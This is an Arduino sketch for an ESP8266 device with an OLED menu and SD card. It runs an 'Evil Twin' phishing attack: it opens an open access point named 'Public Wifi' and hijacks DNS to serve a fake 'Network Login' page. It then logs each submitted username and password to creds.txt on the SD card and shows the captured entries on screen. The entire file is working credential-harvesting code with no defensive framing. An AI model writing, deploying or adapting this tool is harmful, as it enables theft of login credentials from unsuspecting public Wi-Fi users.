#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <SPI.h>
#include <SD.h>

// OLED Configuration (SPI)
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_MOSI    D7  // GPIO13
#define OLED_CLK     D5  // GPIO14
#define OLED_DC      D8  // GPIO15
#define OLED_RESET   D4  // GPIO2
#define OLED_CS      -1  // Not used

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &SPI, OLED_DC, OLED_RESET, OLED_CS);

// Button Configuration
#define BTN_UP     D2  // GPIO4 (internal pull-up)
#define BTN_DOWN   D0  // GPIO16 (external pull-up required)
#define BTN_SELECT D1  // GPIO5 (internal pull-up)

// SD Card Configuration
#define SD_CS D3  // GPIO0

// Network Configuration
String apSSID = "Public Wifi";
String apPassword = "";
bool wifiEnabled = false;
bool apRunning = false;
bool evilTwinEnabled = false;
bool loggingEnabled = true;

// DNS Server
const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer server(80);

// Menu System
enum MenuState {
  MAIN_MENU,
  EVIL_TWIN_MENU,
  VIEW_CLIENTS,
  VIEW_LOGS,
  SETTINGS
};
MenuState currentMenu = MAIN_MENU;
int menuSelection = 0;

void setup() {
  Serial.begin(115200);
  delay(100);

  // Fix for GPIO15 (D8)
  pinMode(OLED_DC, OUTPUT);
  digitalWrite(OLED_DC, LOW);
  delay(10);
  
  // Initialize OLED
  pinMode(OLED_RESET, OUTPUT);
  digitalWrite(OLED_RESET, LOW);
  delay(10);
  digitalWrite(OLED_RESET, HIGH);
  delay(10);

  if(!display.begin(SSD1306_SWITCHCAPVCC)) {
    Serial.println(F("OLED failed"));
    while(1);
  }
  
  // Fix display orientation
  display.setRotation(0);
  display.cp437(true);
  display.clearDisplay();
  display.display();

  // Initialize buttons
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);

  // Initialize SD card
  if (!SD.begin(SD_CS)) {
    Serial.println("SD Card initialization failed!");
    display.clearDisplay();
    display.println("SD Card Fail");
    display.display();
    delay(2000);
  }

  updateDisplay();
}

void loop() {
  handleButtons();
  if (apRunning) {
    dnsServer.processNextRequest();
    server.handleClient();
  }
}

void handleButtons() {
  static unsigned long lastPress = 0;
  if (millis() - lastPress < 200) return;

  if (digitalRead(BTN_UP) == LOW) {
    if (menuSelection > 0) menuSelection--;
    lastPress = millis();
    updateDisplay();
  }
  else if (digitalRead(BTN_DOWN) == LOW) {
    if ((currentMenu == MAIN_MENU && menuSelection < 3) || 
        (currentMenu == EVIL_TWIN_MENU && menuSelection < 2) ||
        (currentMenu == SETTINGS && menuSelection < 1)) {
      menuSelection++;
    }
    lastPress = millis();
    updateDisplay();
  }
  else if (digitalRead(BTN_SELECT) == LOW) {
    handleSelect();
    lastPress = millis();
  }
}

void handleSelect() {
  switch (currentMenu) {
    case MAIN_MENU:
      if (menuSelection == 0) currentMenu = EVIL_TWIN_MENU;
      else if (menuSelection == 1) currentMenu = VIEW_CLIENTS;
      else if (menuSelection == 2) { currentMenu = VIEW_LOGS; viewLogs(); }
      else if (menuSelection == 3) currentMenu = SETTINGS;
      break;
      
    case EVIL_TWIN_MENU:
      if (menuSelection == 0) {
        wifiEnabled = !wifiEnabled;
        if (wifiEnabled) startAP(); else stopAP();
      }
      else if (menuSelection == 1) {
        evilTwinEnabled = !evilTwinEnabled;
        if (evilTwinEnabled && !wifiEnabled) { wifiEnabled = true; startAP(); }
        else if (!evilTwinEnabled) stopAP();
      }
      else if (menuSelection == 2) currentMenu = MAIN_MENU;
      break;
      
    case SETTINGS:
      if (menuSelection == 0) loggingEnabled = !loggingEnabled;
      else if (menuSelection == 1) currentMenu = MAIN_MENU;
      break;
      
    case VIEW_CLIENTS:
    case VIEW_LOGS:
      currentMenu = MAIN_MENU;
      break;
  }
  menuSelection = 0;
  updateDisplay();
}

void startAP() {
  WiFi.softAP(apSSID.c_str(), apPassword.c_str());
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  server.on("/", HTTP_GET, []() {
    String page = "<!DOCTYPE html><html><head><title>Login</title>";
    page += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
    page += "<style>body{font-family:Arial;text-align:center;padding:20px;}";
    page += "input{margin:10px;padding:8px;width:80%;}</style></head>";
    page += "<body><h2>Network Login</h2>";
    page += "<form action='/login' method='post'>";
    page += "<input type='text' name='username' placeholder='Username' required>";
    page += "<input type='password' name='password' placeholder='Password' required>";
    page += "<button type='submit'>Connect</button></form></body></html>";
    server.send(200, "text/html", page);
  });
  
  server.on("/login", HTTP_POST, []() {
    String username = server.arg("username");
    String password = server.arg("password");
    
    if (loggingEnabled) {
      File logFile = SD.open("/creds.txt", FILE_WRITE);
      if (logFile) {
        logFile.print(millis());
        logFile.print(",");
        logFile.print(username);
        logFile.print(",");
        logFile.println(password);
        logFile.close();
      }
    }
    
    server.send(200, "text/html", "<h1>Login Successful</h1>");
  });
  
  server.onNotFound([]() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });
  
  server.begin();
  apRunning = true;
  updateDisplay();
}

void stopAP() {
  server.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  apRunning = false;
  evilTwinEnabled = false;
  updateDisplay();
}

void viewLogs() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0,0);
  
  if (SD.exists("/creds.txt")) {
    File logFile = SD.open("/creds.txt");
    int lines = 0;
    while (logFile.available() && lines < 6) {
      String line = logFile.readStringUntil('\n');
      display.println(line.substring(0, 21)); // Limit line length
      lines++;
    }
    logFile.close();
  } else {
    display.println("No logs found");
  }
  display.display();
  delay(3000);
}

void updateDisplay() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0,0);
  
  switch(currentMenu) {
    case MAIN_MENU:
      display.println("MAIN MENU");
      display.println(menuSelection == 0 ? "> Evil Twin" : "  Evil Twin");
      display.println(menuSelection == 1 ? "> View Clients" : "  View Clients");
      display.println(menuSelection == 2 ? "> View Logs" : "  View Logs");
      display.println(menuSelection == 3 ? "> Settings" : "  Settings");
      break;
      
    case EVIL_TWIN_MENU:
      display.println("EVIL TWIN MENU");
      display.println(menuSelection == 0 ? "> WiFi: " + String(wifiEnabled ? "ON" : "OFF") : "  WiFi: " + String(wifiEnabled ? "ON" : "OFF"));
      display.println(menuSelection == 1 ? "> Mode: " + String(evilTwinEnabled ? "EVIL" : "NORMAL") : "  Mode: " + String(evilTwinEnabled ? "EVIL" : "NORMAL"));
      display.println(menuSelection == 2 ? "> Back" : "  Back");
      if (apRunning) {
        display.print("Clients: ");
        display.println(WiFi.softAPgetStationNum());
      }
      break;
      
    case SETTINGS:
      display.println("SETTINGS");
      display.println(menuSelection == 0 ? "> Logging: " + String(loggingEnabled ? "ON" : "OFF") : "  Logging: " + String(loggingEnabled ? "ON" : "OFF"));
      display.println(menuSelection == 1 ? "> Back" : "  Back");
      break;
      
    case VIEW_CLIENTS:
      display.println("CONNECTED CLIENTS");
      display.print("Count: ");
      display.println(WiFi.softAPgetStationNum());
      display.println("Press any button");
      break;
  }
  display.display();
}